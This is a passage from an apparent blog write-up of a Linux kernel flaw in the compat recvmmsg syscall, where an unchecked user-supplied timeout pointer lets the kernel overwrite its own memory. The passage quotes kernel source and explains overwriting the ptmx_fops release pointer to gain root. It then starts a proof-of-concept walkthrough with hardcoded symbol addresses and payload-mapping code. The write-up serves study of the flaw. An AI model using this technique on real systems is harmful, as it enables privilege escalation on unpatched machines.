Compare this to what the <b>normal</b> x86_64 syscall does:</p>
<div class="enlighter-default enlighter-v-standard enlighter-t-droide "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw" title="Plain text"></div><div class="enlighter-btn enlighter-btn-copy" title="Copy to clipboard"></div><div class="enlighter-btn enlighter-btn-window" title="Open code in new window"></div><div class="enlighter-btn enlighter-btn-website" title="EnlighterJS 3 Syntax Highlighter"></div></div><div class="enlighter" style=""><div class=""><div><span class="enlighter-m0">SYSCALL_DEFINE5</span><span class="enlighter-g1">(</span><span class="enlighter-text">recvmmsg, int, fd, struct mmsghdr __user *, mmsg,</span></div></div><div class=""><div><span class="enlighter-text">          unsigned int, vlen, unsigned int, flags,</span></div></div><div class=""><div><span class="enlighter-text">          struct timespec __user *, timeout</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">  </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">      int datagrams;</span></div></div><div class=""><div><span class="enlighter-text">      struct timespec timeout_sys;</span></div></div><div class=""><div><span class="enlighter-text">      </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">flags </span><span class="enlighter-g0">&amp;</span><span class="enlighter-text"> MSG_CMSG_COMPAT</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">          </span><span class="enlighter-k1">return</span><span class="enlighter-text"> -EINVAL;</span></div></div><div class=""><div><span class="enlighter-text">      </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">!timeout</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">          </span><span class="enlighter-k1">return</span><span class="enlighter-text"> </span><span class="enlighter-m0">__sys_recvmmsg</span><span class="enlighter-g1">(</span><span class="enlighter-text">fd, mmsg, vlen, flags, </span><span class="enlighter-k1">NULL</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-c1">/* -1- */</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">      </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-m0">copy_from_user</span><span class="enlighter-g1">(</span><span class="enlighter-text">&amp;timeout_sys, timeout, </span><span class="enlighter-m0">sizeof</span><span class="enlighter-g1">(</span><span class="enlighter-text">timeout_sys</span><span class="enlighter-g1">)))</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">          </span><span class="enlighter-k1">return</span><span class="enlighter-text"> -EFAULT;</span></div></div><div class=""><div><span class="enlighter-text">      datagrams = </span><span class="enlighter-m0">__sys_recvmmsg</span><span class="enlighter-g1">(</span><span class="enlighter-text">fd, mmsg, vlen, flags, &amp;timeout_sys</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">      </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">datagrams </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> </span><span class="enlighter-n1">0</span><span class="enlighter-text"> </span><span class="enlighter-g0">&amp;&amp;</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">          </span><span class="enlighter-m0">copy_to_user</span><span class="enlighter-g1">(</span><span class="enlighter-text">timeout, &amp;timeout_sys, </span><span class="enlighter-m0">sizeof</span><span class="enlighter-g1">(</span><span class="enlighter-text">timeout_sys</span><span class="enlighter-g1">)))</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">          datagrams = -EFAULT;</span></div></div><div class=""><div><span class="enlighter-text">      </span><span class="enlighter-k1">return</span><span class="enlighter-text"> datagrams;</span></div></div><div class=""><div><span class="enlighter-text">  </span><span class="enlighter-g1">}</span></div></div></div><div class="enlighter-raw">SYSCALL_DEFINE5(recvmmsg, int, fd, struct mmsghdr __user *, mmsg,
          unsigned int, vlen, unsigned int, flags,
          struct timespec __user *, timeout)
  {
      int datagrams;
      struct timespec timeout_sys;
      if (flags &amp; MSG_CMSG_COMPAT)
          return -EINVAL;
      if (!timeout)
          return __sys_recvmmsg(fd, mmsg, vlen, flags, NULL);
/* -1- */
      if (copy_from_user(&amp;timeout_sys, timeout, sizeof(timeout_sys)))
          return -EFAULT;
      datagrams = __sys_recvmmsg(fd, mmsg, vlen, flags, &amp;timeout_sys);
      if (datagrams &gt; 0 &amp;&amp;
          copy_to_user(timeout, &amp;timeout_sys, sizeof(timeout_sys)))
          datagrams = -EFAULT;
      return datagrams;
  }</div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">SYSCALL_DEFINE5(recvmmsg, int, fd, struct mmsghdr __user *, mmsg,
          unsigned int, vlen, unsigned int, flags,
          struct timespec __user *, timeout)
  {
      int datagrams;
      struct timespec timeout_sys;
      if (flags &amp; MSG_CMSG_COMPAT)
          return -EINVAL;
      if (!timeout)
          return __sys_recvmmsg(fd, mmsg, vlen, flags, NULL);
/* -1- */
      if (copy_from_user(&amp;timeout_sys, timeout, sizeof(timeout_sys)))
          return -EFAULT;
      datagrams = __sys_recvmmsg(fd, mmsg, vlen, flags, &amp;timeout_sys);
      if (datagrams &gt; 0 &amp;&amp;
          copy_to_user(timeout, &amp;timeout_sys, sizeof(timeout_sys)))
          datagrams = -EFAULT;
      return datagrams;
  }</pre>
<p>At -1- the timeout struct is copied into a kernel space variable before passing it to __sys_recvmmsg. That’s the correct way to do it.</p>
<h2>Digging Deeper Into the Vulnerability</h2>
<p>First things first: the timespec structure, defined in include/uapi/linux/time.h:</p>
<div class="enlighter-default enlighter-v-standard enlighter-t-droide "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw" title="Plain text"></div><div class="enlighter-btn enlighter-btn-copy" title="Copy to clipboard"></div><div class="enlighter-btn enlighter-btn-window" title="Open code in new window"></div><div class="enlighter-btn enlighter-btn-website" title="EnlighterJS 3 Syntax Highlighter"></div></div><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">struct timespec </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    long tv_sec;   </span><span class="enlighter-c1">/* seconds */</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    long tv_nsec;  </span><span class="enlighter-c1">/* nanoseconds */</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">}</span><span class="enlighter-text">;</span></div></div></div><div class="enlighter-raw">struct timespec {
    long tv_sec;   /* seconds */
    long tv_nsec;  /* nanoseconds */
};</div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">struct timespec {
    long tv_sec;   /* seconds */
    long tv_nsec;  /* nanoseconds */
};</pre>
<p>Now let’s take a closer look at what happens to the timeout pointer passed from user space.<br>
From compat_sys_recvmmsg the pointer is passed to __sys_recvmmsg, located in net/socket.c:</p>
<div class="enlighter-default enlighter-v-standard enlighter-t-droide "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw" title="Plain text"></div><div class="enlighter-btn enlighter-btn-copy" title="Copy to clipboard"></div><div class="enlighter-btn enlighter-btn-window" title="Open code in new window"></div><div class="enlighter-btn enlighter-btn-website" title="EnlighterJS 3 Syntax Highlighter"></div></div><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">int </span><span class="enlighter-m0">__sys_recvmmsg</span><span class="enlighter-g1">(</span><span class="enlighter-text">int fd, struct mmsghdr __user *mmsg, unsigned int vlen,</span></div></div><div class=""><div><span class="enlighter-text">           unsigned int flags, struct timespec *timeout</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">timeout </span><span class="enlighter-g0">&amp;&amp;</span><span class="enlighter-text">                                      </span><span class="enlighter-c1">/* -1- */</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-m0">poll_select_set_timeout</span><span class="enlighter-g1">(</span><span class="enlighter-text">&amp;end_time, timeout-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">tv_sec,</span></div></div><div class=""><div><span class="enlighter-text">                    timeout-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">tv_nsec</span><span class="enlighter-g1">))</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k1">return</span><span class="enlighter-text"> -EINVAL;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-c1">/* ... */</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">while</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">datagrams </span><span class="enlighter-g1">&lt;</span><span class="enlighter-text"> vlen</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">{</span><span class="enlighter-text">              </span><span class="enlighter-c1">/* -2- */</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-c1">/*</span></div></div><div class=""><div><span class="enlighter-c1">         * Basically just a loop calling recvmsg</span></div></div><div class=""><div><span class="enlighter-c1">         * until the timeout is hit or vlen messages have</span></div></div><div class=""><div><span class="enlighter-c1">         * been received.</span></div></div><div class=""><div><span class="enlighter-c1">         */</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">MSG_CMSG_COMPAT </span><span class="enlighter-g0">&amp;</span><span class="enlighter-text"> flags</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            err = </span><span class="enlighter-m0">___sys_recvmsg</span><span class="enlighter-g1">(</span><span class="enlighter-text">sock, </span><span class="enlighter-g1">(</span><span class="enlighter-text">struct msghdr __user *</span><span class="enlighter-g1">)</span><span class="enlighter-text">compat_entry,</span></div></div><div class=""><div><span class="enlighter-text">                         &amp;msg_sys, flags </span><span class="enlighter-g0">&amp;</span><span class="enlighter-text"> ~MSG_WAITFORONE,</span></div></div><div class=""><div><span class="enlighter-text">                         datagrams</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-c1">/* ... */</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-g1">}</span><span class="enlighter-text"> </span><span class="enlighter-k1">else</span><span class="enlighter-text"> </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            err = </span><span class="enlighter-m0">___sys_recvmsg</span><span class="enlighter-g1">(</span><span class="enlighter-text">sock,</span></div></div><div class=""><div><span class="enlighter-text">                         </span><span class="enlighter-g1">(</span><span class="enlighter-text">struct msghdr __user *</span><span class="enlighter-g1">)</span><span class="enlighter-text">entry,</span></div></div><div class=""><div><span class="enlighter-text">                         &amp;msg_sys, flags </span><span class="enlighter-g0">&amp;</span><span class="enlighter-text"> ~MSG_WAITFORONE,</span></div></div><div class=""><div><span class="enlighter-text">                         datagrams</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-c1">/* ... */</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-c1">/* ... */</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">timeout</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-m0">ktime_get_ts</span><span class="enlighter-g1">(</span><span class="enlighter-text">timeout</span><span class="enlighter-g1">)</span><span class="enlighter-text">;         </span><span class="enlighter-c0"> // put current time into *timeout</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">                                           </span><span class="enlighter-c0"> // then subtract that from end_time</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            *timeout = </span><span class="enlighter-m0">timespec_sub</span><span class="enlighter-g1">(</span><span class="enlighter-text">end_time, *timeout</span><span class="enlighter-g1">)</span><span class="enlighter-text">;        </span><span class="enlighter-c1">/* -3- */</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">timeout-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">tv_sec </span><span class="enlighter-g1">&lt;</span><span class="enlighter-text"> </span><span class="enlighter-n1">0</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">{</span><span class="enlighter-text">                        </span></div></div><div class=""><div><span class="enlighter-text">                timeout-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">tv_sec = timeout-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">tv_nsec = </span><span class="enlighter-n1">0</span><span class="enlighter-text">;         </span><span class="enlighter-c1">/* -4- */</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">                break;</span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-c1">/* Timeout, return less than vlen datagrams */</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">timeout-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">tv_nsec == </span><span class="enlighter-n1">0</span><span class="enlighter-text"> </span><span class="enlighter-g0">&amp;&amp;</span><span class="enlighter-text"> timeout-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">tv_sec == </span><span class="enlighter-n1">0</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">                break;</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-c1">/* ... */</span></div></div></div><div class="enlighter-raw">int __sys_recvmmsg(int fd, struct mmsghdr __user *mmsg, unsigned int vlen,
           unsigned int flags, struct timespec *timeout)
{
    if (timeout &amp;&amp;                                      /* -1- */
        poll_select_set_timeout(&amp;end_time, timeout-&gt;tv_sec,
                    timeout-&gt;tv_nsec))
        return -EINVAL;
    /* ... */
    while (datagrams &lt; vlen) {              /* -2- */
        /*
         * Basically just a loop calling recvmsg
         * until the timeout is hit or vlen messages have
         * been received.
         */
        if (MSG_CMSG_COMPAT &amp; flags) {
            err = ___sys_recvmsg(sock, (struct msghdr __user *)compat_entry,
                         &amp;msg_sys, flags &amp; ~MSG_WAITFORONE,
                         datagrams);
            /* ... */
        } else {
            err = ___sys_recvmsg(sock,
                         (struct msghdr __user *)entry,
                         &amp;msg_sys, flags &amp; ~MSG_WAITFORONE,
                         datagrams);
            /* ... */
        }
        /* ... */
        if (timeout) {
            ktime_get_ts(timeout);          // put current time into *timeout
                                            // then subtract that from end_time
            *timeout = timespec_sub(end_time, *timeout);        /* -3- */
            if (timeout-&gt;tv_sec &lt; 0) {                        
                timeout-&gt;tv_sec = timeout-&gt;tv_nsec = 0;         /* -4- */
                break;
            }
            /* Timeout, return less than vlen datagrams */
            if (timeout-&gt;tv_nsec == 0 &amp;&amp; timeout-&gt;tv_sec == 0)
                break;
        }
    /* ... */</div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">int __sys_recvmmsg(int fd, struct mmsghdr __user *mmsg, unsigned int vlen,
           unsigned int flags, struct timespec *timeout)
{
    if (timeout &amp;&amp;                                      /* -1- */
        poll_select_set_timeout(&amp;end_time, timeout-&gt;tv_sec,
                    timeout-&gt;tv_nsec))
        return -EINVAL;
    /* ... */
    while (datagrams &lt; vlen) {              /* -2- */
        /*
         * Basically just a loop calling recvmsg
         * until the timeout is hit or vlen messages have
         * been received.
         */
        if (MSG_CMSG_COMPAT &amp; flags) {
            err = ___sys_recvmsg(sock, (struct msghdr __user *)compat_entry,
                         &amp;msg_sys, flags &amp; ~MSG_WAITFORONE,
                         datagrams);
            /* ... */
        } else {
            err = ___sys_recvmsg(sock,
                         (struct msghdr __user *)entry,
                         &amp;msg_sys, flags &amp; ~MSG_WAITFORONE,
                         datagrams);
            /* ... */
        }
        /* ... */
        if (timeout) {
            ktime_get_ts(timeout);          // put current time into *timeout
                                            // then subtract that from end_time
            *timeout = timespec_sub(end_time, *timeout);        /* -3- */
            if (timeout-&gt;tv_sec &lt; 0) {                        
                timeout-&gt;tv_sec = timeout-&gt;tv_nsec = 0;         /* -4- */
                break;
            }
            /* Timeout, return less than vlen datagrams */
            if (timeout-&gt;tv_nsec == 0 &amp;&amp; timeout-&gt;tv_sec == 0)
                break;
        }
    /* ... */</pre>
<p>The first thing to note here is the block at -1-. Here poll_select_set_timeout will set end_time to the time when the timeout will be over. More importantly, it will check whether timeout points to a valid timespec struct. If it does not then it will return -EINVAL and thus cause the syscall to fail.<br>
Here is the function performing the check (include/linux/time.h):</p>
<div class="enlighter-default enlighter-v-standard enlighter-t-droide "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw" title="Plain text"></div><div class="enlighter-btn enlighter-btn-copy" title="Copy to clipboard"></div><div class="enlighter-btn enlighter-btn-window" title="Open code in new window"></div><div class="enlighter-btn enlighter-btn-website" title="EnlighterJS 3 Syntax Highlighter"></div></div><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">static inline bool </span><span class="enlighter-m0">timespec_valid</span><span class="enlighter-g1">(</span><span class="enlighter-text">const struct timespec *ts</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-c1">/* Dates before 1970 are bogus */</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">ts-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">tv_sec </span><span class="enlighter-g1">&lt;</span><span class="enlighter-text"> </span><span class="enlighter-n1">0</span><span class="enlighter-g1">)</span><span class="enlighter-text">                                 </span><span class="enlighter-c1">/* -5- */</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k1">return</span><span class="enlighter-text"> </span><span class="enlighter-k1">false</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-c1">/* Can't have more nanoseconds then a second */</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">((</span><span class="enlighter-text">unsigned long</span><span class="enlighter-g1">)</span><span class="enlighter-text">ts-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">tv_nsec </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">= NSEC_PER_SEC</span><span class="enlighter-g1">)</span><span class="enlighter-text">     </span><span class="enlighter-c1">/* -6- */</span><span class="enlighter-text">  </span><span class="enlighter-c0"> // include/linux/time.h: #define NSEC_PER_SEC 1000000000L</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k1">return</span><span class="enlighter-text"> </span><span class="enlighter-k1">false</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">return</span><span class="enlighter-text"> </span><span class="enlighter-k1">true</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">}</span></div></div></div><div class="enlighter-raw">static inline bool timespec_valid(const struct timespec *ts)
{
    /* Dates before 1970 are bogus */
    if (ts-&gt;tv_sec &lt; 0)                                 /* -5- */
        return false;
    /* Can't have more nanoseconds then a second */
    if ((unsigned long)ts-&gt;tv_nsec &gt;= NSEC_PER_SEC)     /* -6- */   // include/linux/time.h: #define NSEC_PER_SEC 1000000000L
        return false;
    return true;
}</div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">static inline bool timespec_valid(const struct timespec *ts)
{
    /* Dates before 1970 are bogus */
    if (ts-&gt;tv_sec &lt; 0)                                 /* -5- */
        return false;
    /* Can't have more nanoseconds then a second */
    if ((unsigned long)ts-&gt;tv_nsec &gt;= NSEC_PER_SEC)     /* -6- */   // include/linux/time.h: #define NSEC_PER_SEC 1000000000L
        return false;
    return true;
}</pre>
<p>At -5- the first long, tv_sec, is checked to be a positive number, meaning it’s most significant byte must be smaller than 0x8, and at -6- the tv_nsec member is checked to be smaller than 1,000,000,000 (= 1 second), so tv_nsec must be between 0 and 0x000000003b9aca00. Keep this in mind as we move on.<br>
Next the code enters the loop at -2-, waiting for incoming packets. After a packet has been received by __sys_recvmsg the timeout struct is updated to contain the time left (-3-).</p>
<p>If that value is &lt; 0, both tv_sec and tv_nsec are set to zero at -4- and the function returns.<br>
The loop will thus exit if either vlen messages have been received or the timeout is hit after receiving a packet. Do note the call will only return after a packet has been received, even if the timeout has already been hit. By sending packets to ourselves from a forked child, we can enter the code that updates the timeout at any time. And by setting vlen to 1, we can guarantee that timeout is only written to once.</p>
<h2>The Exploitation vector</h2>
<p>So what can we do with this situation from an exploitation perspective?</p>
<p>The basic idea that comes to mind is pointing the timeout pointer to sensitive kernel data with known content and waiting a specific amount of time until sending a UDP packet (thus reaching the block at -3- in the code above). This will cause the function to update the timeout structure and return.</p>
<p>In other words we will make the kernel treat some of its own memory (preferably a function pointer) as the timeout argument and thus cause the kernel to overwrite part of its own memory. This allows us to write a nearly arbitrary value to an address of our choosing (we have 64bit pointers so we can address the whole address space), as long as the original value is known and there is a valid timespec struct at that address.</p>
<p>Since kernel pointers always have the high 4 bytes set to 0xff they make a good target.<br>
Imagine the following situation:</p>
<pre style="font-family: monospace; font-size: 12px;">pointer: 0xffffffff44434241               uninitialized data
     (little endian)
+-------------------------+-------------------------+-------------------------+
| 41 42 43 44 ff ff ff ff | 00 00 00 00 00 00 00 00 | 00 00 00 00 00 00 00 00 |
+-------------------------+-------------------------+-------------------------+
                       ^ point timeout here
                       [-------- tv_sec -------] [------- tv_nsec -------]</pre>
<p>If the address of the last (most significant) byte of the pointer is passed as a timeout, waiting &gt;= 255 seconds will clear that byte without mangling up adjacent data as the whole block is set to zero. Repeating this for the next two bytes will allow us to point that pointer into user space (this is what the original version of the exploit did).</p>
<p>To speed things up the bytes can be cleared in parallel. For this to work the time between the syscall and the incoming packet must be &gt; 254s and &lt; 255s. This will cause the recvmmsg function to write garbage to the following two longs, as they are treated as tv_nsec value and will then contain the remaining nanoseconds of the timeout.</p>
<h2>A Walk-through of the Proof-of-concept Exploit</h2>
<p>Now let’s start with a brief overview on the steps the exploit takes to get root privileges.<br>
The exploit follows the common scheme of tricking the kernel into executing code in user space memory. This has quite a few advantages, including being able to write the payload in nicely readable C code. For a more detailed discussion of this technique refer to [3].</p>
<p>Here are the basic steps:</p>
<ul>
<li>Allocate executable and writable memory at the address to which the kernel will jump, and copy the kernel payload at the end of that region.</li>
</ul>
<ul>
<li>Target the release function pointer of the ptmx_fops structure located in the .data &nbsp;section which is writable kernel memory. Zero out the three most significant bytes, thereby turning it into a pointer inside of the region mapped by user space.</li>
</ul>
<ul>
<li>Open /dev/ptmx and close it, causing ptmx_fops-&gt;release() to be called.</li>
</ul>
<ul>
<li>Check if root privileges were obtained and start a shell.</li>
</ul>
<p>Let’s examine each of those steps in more detail.</p>
<h3>Resolving symbols</h3>
<p>The exploit needs four kernel symbols to be resolved, those are</p>
<div class="enlighter-default enlighter-v-standard enlighter-t-droide "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw" title="Plain text"></div><div class="enlighter-btn enlighter-btn-copy" title="Copy to clipboard"></div><div class="enlighter-btn enlighter-btn-window" title="Open code in new window"></div><div class="enlighter-btn enlighter-btn-website" title="EnlighterJS 3 Syntax Highlighter"></div></div><div class="enlighter" style=""><div class=""><div><span class="enlighter-c0">#define PTMX_FOPS           0xffffffff81fb30c0LL</span><span class="enlighter-c0"></span></div></div><div class=""><div><span class="enlighter-c0">#define TTY_RELEASE         0xffffffff8142fec0LL</span><span class="enlighter-c0"></span></div></div><div class=""><div><span class="enlighter-c0">#define COMMIT_CREDS        0xffffffff8108ad40LL</span><span class="enlighter-c0"></span></div></div><div class=""><div><span class="enlighter-c0">#define PREPARE_KERNEL_CRED 0xffffffff8108b010LL</span></div></div></div><div class="enlighter-raw">#define PTMX_FOPS           0xffffffff81fb30c0LL
#define TTY_RELEASE         0xffffffff8142fec0LL
#define COMMIT_CREDS        0xffffffff8108ad40LL
#define PREPARE_KERNEL_CRED 0xffffffff8108b010LL</div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">#define PTMX_FOPS           0xffffffff81fb30c0LL
#define TTY_RELEASE         0xffffffff8142fec0LL
#define COMMIT_CREDS        0xffffffff8108ad40LL
#define PREPARE_KERNEL_CRED 0xffffffff8108b010LL</pre>
<p>They can be taken from /boot/System.map or the decompressed kernel image via nm.<br>
The PoC linked at the end of this post also contains a script (build.sh) which will help resolving with the symbols. The README in the PoC provides details on how to use it.</p>
<h3>Setting things up</h3>
<div class="enlighter-default enlighter-v-standard enlighter-t-droide "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw" title="Plain text"></div><div class="enlighter-btn enlighter-btn-copy" title="Copy to clipboard"></div><div class="enlighter-btn enlighter-btn-window" title="Open code in new window"></div><div class="enlighter-btn enlighter-btn-website" title="EnlighterJS 3 Syntax Highlighter"></div></div><div class="enlighter" style=""><div class=""><div><span class="enlighter-c1">/* Prepare payload... */</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-m0">printf</span><span class="enlighter-g1">(</span><span class="enlighter-s0">"preparing payload buffer...\n"</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">code = </span><span class="enlighter-g1">(</span><span class="enlighter-text">long</span><span class="enlighter-g1">)</span><span class="enlighter-m0">mmap</span><span class="enlighter-g1">((</span><span class="enlighter-k1">void</span><span class="enlighter-text">*</span><span class="enlighter-g1">)(</span><span class="enlighter-text">TTY_RELEASE </span><span class="enlighter-g0">&amp;</span><span class="enlighter-text"> 0x000000fffffff000LL</span><span class="enlighter-g1">)</span><span class="enlighter-text">, PAYLOADSIZE, </span><span class="enlighter-n1">7</span><span class="enlighter-text">, </span><span class="enlighter-n2">0x32</span><span class="enlighter-text">, </span><span class="enlighter-n1">0</span><span class="enlighter-text">, </span><span class="enlighter-n1">0</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-m0">memset</span><span class="enlighter-g1">((</span><span class="enlighter-k1">void</span><span class="enlighter-text">*</span><span class="enlighter-g1">)</span><span class="enlighter-text">code, </span><span class="enlighter-n2">0x90</span><span class="enlighter-text">, PAYLOADSIZE</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">code += PAYLOADSIZE - </span><span class="enlighter-n1">1024</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-m0">memcpy</span><span class="enlighter-g1">((</span><span class="enlighter-k1">void</span><span class="enlighter-text">*</span><span class="enlighter-g1">)</span><span class="enlighter-text">code, &amp;kernel_payload, </span><span class="enlighter-n1">1024</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div></div><div class="enlighter-raw">/* Prepare payload... */
printf("preparing payload buffer...\n");
code = (long)mmap((void*)(TTY_RELEASE &amp; 0x000000fffffff000LL), PAYLOADSIZE, 7, 0x32, 0, 0);
memset((void*)code, 0x90, PAYLOADSIZE);
code += PAYLOADSIZE - 1024;
memcpy((void*)code, &amp;kernel_payload, 1024);</div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">/* Prepare payload... */
printf("preparing payload buffer...\n");
code = (long)mmap((void*)(TTY_RELEASE &amp; 0x000000fffffff000LL), PAYLOADSIZE, 7, 0x32, 0, 0);
memset((void*)code, 0x90, PAYLOADSIZE);
code += PAYLOADSIZE - 1024;
memcpy((void*)code, &amp;kernel_payload, 1024);</pre>
